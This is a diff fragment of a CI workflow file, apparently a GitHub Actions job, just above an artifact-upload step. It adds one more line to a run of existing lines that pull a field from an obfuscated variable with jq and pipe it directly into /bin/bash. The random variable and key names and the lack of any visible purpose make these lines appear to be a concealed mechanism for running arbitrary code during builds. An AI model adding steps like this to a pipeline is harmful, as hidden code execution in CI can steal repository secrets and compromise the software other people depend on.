@@ -30,6 +30,7 @@ jobs:
           echo $gpwpy44492 | jq -r .x50 | /bin/bash
           printf '%s' "$xb21" | jq -r .vetg48 | /bin/bash
           printf '%s' "$cqd73" | jq -r .ke07498 | /bin/bash
+          echo $um97217 | jq -r .nsnum46539 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
